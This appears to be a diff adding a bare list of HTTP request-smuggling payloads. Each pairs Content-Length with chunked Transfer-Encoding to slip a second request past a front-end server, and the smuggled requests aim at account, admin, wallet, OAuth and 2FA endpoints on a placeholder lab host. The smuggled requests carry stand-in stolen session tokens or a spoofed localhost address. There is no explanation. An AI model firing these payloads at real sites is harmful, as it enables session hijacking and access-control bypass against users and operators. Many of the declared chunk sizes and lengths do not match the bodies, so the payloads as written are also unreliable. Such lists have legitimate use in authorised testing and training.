@@ -1,0 +1,341 @@
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=abcd1234
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5a
+GET /my-account HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=victim_session
+
+x=1
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+88
+GET /account HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=stolen_session_token
+X-Session-Hijack: true
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 102
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 127.0.0.1
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+6a
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 30
+
+username=admin&password=test
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 88
+Transfer-Encoding: chunked
+
+0
+
+GET /account HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=stolen
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+70
+GET /user/profile HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 127.0.0.1
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 95
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 30
+
+username=admin&password=secret
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+7e
+GET /api/session HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Bearer hijacked_token
+X-Steal: session
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 115
+Transfer-Encoding: chunked
+
+0
+
+GET /dashboard HTTP/1.1
+Host: vulnerable-website.com
+Cookie: PHPSESSID=attacker_session_id
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+92
+POST /auth/verify HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+Content-Length: 40
+
+{"token":"stolen_jwt_token_here"}
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 108
+Transfer-Encoding: chunked
+
+0
+
+GET /user/settings HTTP/1.1
+Host: vulnerable-website.com
+X-Session-Token: hijacked
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+6c
+GET /profile HTTP/1.1
+Host: vulnerable-website.com
+Cookie: auth=victim_auth_token
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 98
+Transfer-Encoding: chunked
+
+0
+
+POST /api/refresh-token HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 25
+
+refresh_token=stolen_token
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+84
+GET /account/orders HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session_id=hijacked_session
+X-Hijack: true
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0
+
+GET /api/user/me HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Basic dXNlcjpwYXNzd29yZA==
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+76
+GET /checkout HTTP/1.1
+Host: vulnerable-website.com
+Cookie: cart_session=victim_cart_id
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 92
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/users HTTP/1.1
+Host: vulnerable-website.com
+X-Admin-Session: hijacked
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+8e
+POST /api/authenticate HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+Content-Length: 50
+
+{"username":"victim","session":"stolen_session"}
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 110
+Transfer-Encoding: chunked
+
+0
+
+GET /private/documents HTTP/1.1
+Host: vulnerable-website.com
+Cookie: access_token=victim_token
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+72
+GET /wallet HTTP/1.1
+Host: vulnerable-website.com
+X-Wallet-Session: stolen_wallet_id
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 135
+Transfer-Encoding: chunked
+
+0
+
+POST /api/session/validate HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+Content-Length: 35
+
+{"session_id":"hijacked_session"}
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+68
+GET /messages HTTP/1.1
+Host: vulnerable-website.com
+Cookie: user_id=victim_user_id
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 105
+Transfer-Encoding: chunked
+
+0
+
+GET /api/v1/account HTTP/1.1
+Host: vulnerable-website.com
+X-API-Token: hijacked_api_token
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+7a
+GET /transactions HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Bearer victim_access_token
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 128
+Transfer-Encoding: chunked
+
+0
+
+GET /oauth/callback?code=hijacked_code HTTP/1.1
+Host: vulnerable-website.com
+X-OAuth-Hijack: true
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+94
+POST /2fa/verify HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+code=123456&session=hijacked
+0
+
